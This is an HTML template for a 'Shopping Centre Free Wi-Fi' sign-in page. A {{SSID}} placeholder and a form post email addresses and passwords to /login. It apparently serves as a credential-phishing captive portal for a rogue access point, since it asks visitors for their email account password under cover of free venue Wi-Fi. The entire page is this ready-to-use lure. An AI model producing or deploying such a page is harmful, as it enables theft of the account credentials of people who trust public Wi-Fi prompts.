<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Shopping Centre Wi-Fi</title>
<style>
*{box-sizing:border-box;font-family:'Helvetica Neue',Arial,sans-serif}
body{margin:0;background:#eceff3;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{width:400px;max-width:94vw;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 8px 26px rgba(30,40,60,.14)}
.hd{background:#e4007c;color:#fff;padding:22px 24px;text-align:center}
.hd b{font-size:19px;font-weight:700;letter-spacing:.5px}
.bd{padding:24px}
p.lead{color:#55606e;font-size:14px;margin:0 0 20px;line-height:1.5;text-align:center}
label{display:block;font-size:12px;color:#66707d;margin:13px 0 5px;font-weight:600}
input{width:100%;padding:13px;border:1px solid #d3d9e0;border-radius:8px;font-size:15px}
input:focus{outline:none;border-color:#e4007c;box-shadow:0 0 0 2px rgba(228,0,124,.14)}
button{width:100%;margin-top:22px;padding:14px;border:0;border-radius:8px;background:#e4007c;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
.ft{padding:13px 24px;background:#faf0f6;color:#b58aa5;font-size:11px;border-top:1px solid #f2dbe9;text-align:center}
</style></head><body>
<form class="card" method="POST" action="/login">
<div class="hd"><b>Shopping Centre Free Wi-Fi</b></div>
<div class="bd">
<p class="lead">Sign in to connect to <b>{{SSID}}</b> and receive today's offers while you shop.</p>
<label>Email</label>
<input name="email" type="email" autocomplete="username" placeholder="you@example.com" required>
<label>Password</label>
<input name="password" type="password" autocomplete="current-password" placeholder="Password" required>
<button type="submit">Start browsing</button>
</div>
<div class="ft">Visitor Wi-Fi &middot; Centre management</div>
</form></body></html>
